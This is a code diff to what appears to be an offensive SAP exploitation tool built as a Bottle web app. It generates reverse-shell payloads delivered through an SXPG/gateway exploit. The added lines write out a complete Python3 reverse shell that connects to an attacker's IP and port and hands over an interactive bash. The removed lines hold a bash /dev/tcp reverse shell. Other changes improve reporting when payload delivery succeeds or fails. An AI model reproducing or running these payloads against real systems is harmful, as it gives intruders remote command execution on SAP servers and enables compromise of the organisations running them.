@@ -337,10 +337,22 @@ def _generate_payload(os_type: str, ip: str, port: int) -> dict:
             "display": f"PowerShell reverse shell → {ip}:{port}",
         }
     else:
+        # Use python3 reverse shell — more reliable than bash /dev/tcp
+        # through SXPG/GW exploit because it doesn't need shell redirections
+        # that get mangled by parameter splitting.
+        py_cmd = (
+            f"import socket,subprocess,os;"
+            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+            f"s.connect(('{ip}',{port}));"
+            f"os.dup2(s.fileno(),0);"
+            f"os.dup2(s.fileno(),1);"
+            f"os.dup2(s.fileno(),2);"
+            f"subprocess.call(['/bin/bash','-i'])"
+        )
         return {
-            "command": "/bin/sh",
-            "params": f"-c /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1",
-            "display": f"Bash reverse shell → {ip}:{port}",
+            "command": "python3",
+            "params": f"-c {py_cmd}",
+            "display": f"Python3 reverse shell → {ip}:{port}",
         }
 
 
@@ -1249,9 +1261,15 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
             if result.get("success"):
                 print(f"[+] {sid}: Reverse shell payload delivered")
+                if result.get("output"):
+                    for line in result["output"][:5]:
+                        print(f"    {line}")
             else:
-                print(f"[-] {sid}: Payload delivery failed: "
-                      f"{result.get('error', 'unknown')}")
+                err = result.get("error", "unknown")
+                print(f"[-] {sid}: Payload delivery failed: {err}")
+                with _shell_lock:
+                    if _shell_session and _shell_session.status == "waiting":
+                        _shell_session.error_msg = f"Payload failed: {err}"
 
         threading.Thread(target=_send, daemon=True).start()
         return json.dumps({"status": "ok", "port": listen_port})
